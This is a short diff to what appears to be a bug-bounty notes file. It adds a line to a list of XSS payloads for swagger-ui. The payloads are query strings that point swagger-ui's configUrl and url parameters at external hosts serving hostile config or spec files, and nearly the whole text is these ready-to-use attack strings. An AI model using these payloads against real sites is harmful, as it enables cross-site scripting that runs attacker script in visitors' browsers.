@@ -111,3 +111,4 @@ grep -v -E '\.json$|\.js$|\.jpg$|\.png$' wordlist.txt
 find xss in swagger-ui with the following payloads
 
 ?configUrl=https://xss.smarpo.com/test.json&url=https://jumpy-floor.surge.sh/test.yaml
+?configUrl=https://jumpy-floor.surge.sh/test.json
